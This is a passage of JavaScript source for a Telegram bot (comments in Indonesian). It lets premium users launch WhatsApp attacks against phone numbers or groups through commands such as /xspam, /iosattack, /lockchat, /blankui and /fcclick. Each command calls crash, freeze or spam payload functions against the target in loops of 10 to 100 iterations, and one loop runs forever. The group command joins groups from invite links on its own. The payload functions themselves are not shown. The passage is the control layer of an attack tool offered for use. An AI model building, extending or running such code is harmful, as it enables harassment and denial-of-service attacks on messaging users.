    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : FC CLICK (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 10; i++) {
        await X7Klik(sock, target);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : FC CLICK (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
    }
  );
});

bot.command("delaygb", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const text = ctx.message.text || "";
  
  // Regex super aman untuk mengambil kode undangan WhatsApp Group
  const inviteCodeMatch = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22,26})/);
  
  if (!inviteCodeMatch) {
    return ctx.reply(`❌ Format link salah!\nExample: /delaygb https://chat.whatsapp.com/InviteCodeGrupNya`);
  }

  const inviteCode = inviteCodeMatch[1]; // Ini kode bersihnya (tanpa spasi / parameter sisa)
  let target = null;

  try {
    // LANGKAH 1: Cek internal cache bot dulu (apakah bot sudah di dalam grup?)
    try {
      const chats = await sock.groupFetchAllParticipating();
      const groups = Object.values(chats);
      
      // Cari yang metadata inviteCode-nya sama, atau id grup-nya sama (jika ada)
      const matchingGroup = groups.find(g => g.inviteCode === inviteCode || g.id?.includes(inviteCode));
      if (matchingGroup) {
        target = matchingGroup.id;
      }
    } catch (cacheError) {
      console.log("Gagal fetch internal cache, lanjut metode langsung...");
    }

    // LANGKAH 2: Jika JID belum ketemu dari cache, pakai groupGetInviteInfo / groupAcceptInvite
    if (!target) {
      try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode);
        target = groupInfo.id;
        
        // Langsung auto join
        await sock.groupAcceptInvite(inviteCode);
      } catch (inviteError) {
        // Handle kondisi unik: Baileys sering return error 409 (conflict) kalau bot SEBENARNYA SUDAH JOIN
        if (inviteError.status === 409 || String(inviteError).includes("conflict")) {
          // Jika error karena sudah join, coba tebak atau ekstrak JID dari object error
          target = inviteError.context?.jid || inviteError.jid;
        }
        
        // Jika masih tidak ketemu target JID-nya, coba paksa join langsung tanpa GetInfo
        if (!target) {
          try {
            target = await sock.groupAcceptInvite(inviteCode);
          } catch (forceJoinError) {
            // Jika force join juga mengembalikan info JID (di beberapa versi Baileys)
            if (forceJoinError.context?.jid) target = forceJoinError.context.jid;
          }
        }
      }
    }

    // PENGAMAN TERAKHIR: Jika semua cara di atas gagal mendapatkan JID (@g.us)
    if (!target) {
      return ctx.reply("❌ Gagal mendapatkan ID Grup. Pastikan bot belum di-banned atau link undangan masih aktif!");
    }

  } catch (globalError) {
    console.error("Error Group Join:", globalError);
    return ctx.reply("❌ Terjadi kesalahan sistem saat memproses grup.");
  }

  // --- JIKA JID BERHASIL DIDAPATKAN, PROSES SPAM SEPERTI BIASA ---
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY HARD (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : READY & SENDING</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
  });

  // Proses Eksekusi Spamming
  await (async () => {
    for (let i = 0; i < 100; i++) {
        await X7DelayGb(sock, target);
        await sleep(1500);
    }
  })();

  // Update status setelah selesai
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY HARD (GROUP)

🤍 User   : ${username}
🎯 Target : Group (Link)
Type   : Status
🚀 Result : SPAM COMPLETE</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗚𝗿𝗼𝘂𝗽ᯤ", url: `https://chat.whatsapp.com/${inviteCode}`, style: "danger" }]],
      },
    }
  );
});

//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("xspam", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  (async () => {
    while (true) {
      await delaycrashV4(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("xspam1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam1 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await dingleyhard(sock, target, ptcp = true);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("xspam2", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam2 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await Delayft(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("xspam3", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam3 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await RX7DELAYNEW(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});


bot.command("xspam4", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /xspam4 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await DelayBulldoNew(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("combo1", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /combo1 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await ForceXDelayX7(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("galaxy", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /galaxy 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await CrmXcarousel(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("combo", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /combo 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await MBGCOMBO(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : INVISIBLE DELAY  HARD

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("stcblank", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /stcblank 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : BLANK STIKER

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await stickerUi(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : BLANK STIKER

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("uisystem", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uisystem 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : UI SYSTEM

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await button(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : UI SYSTEM

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("lockchat", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /lockchat 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : LOCK CHAT

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await lockchat(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : LOCK CHAT

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("delayvisible", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayvisible 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : DELAY VISIBLE

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await DelayFreezerByMia(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : DELAY VISIBLE

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("blankui", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blankui 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : BLANK UI

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await BlankWithProto(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE :  BLANK UI 

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("boost", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /boost 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : FC NO CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 50; i++) {
      await X7Force(sock, target, false) 
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : FC NO CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("fcclick", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /uisystem 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : FC CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 10; i++) {
      await X7Klik(sock, target);
      await fcbutton(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : FC CLICK

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

bot.command("iosattack", checkWhatsAppConnection, checkPremium, checkCommandEnabled, checkCooldown,  async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /iosattack 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const sent = await ctx.sendPhoto("https://l.top4top.io/p_3803smv0s1.jpg", {
    caption: `
<blockquote>💤 MODE : CRASH IOS

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
  });

  await (async () => {
    for (let i = 0; i < 100; i++) {
      await ioskres(sock, target);
      await sleep(1500);
    }
  })();

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    sent.message_id,
    null,
    `
<blockquote>💤 MODE : CRASH IOS

🤍 User   : ${username}
🎯 Target : ${q}
Type   : Status
🚀 Result : SUCCESS SEND</blockquote>
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "㋡𝗖𝗵𝗲𝗰𝗸 𝗧𝗮𝗿𝗴𝗲𝘁ᯤ", url: `https://wa.me/${q}`, style: "danger" }]],
      },
    }
  );
});

const tesfunct = "https://l.top4top.io/p_3803smv0s1.jpg";
bot.command('testfunc', checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const chatId = ctx.chat.id;
    const senderId = ctx.from.id;
    const msg = ctx.message;
    const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    const args = ctx.message.text.split(" ");
    const targetNumber = args[1];
    const formattedNumber = targetNumber?.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    const q = args[1];

    const jumlah = Math.max(
      0,
      Math.min(parseInt(args[2]) || 1, 1000)
    );

    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply(
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    const target =
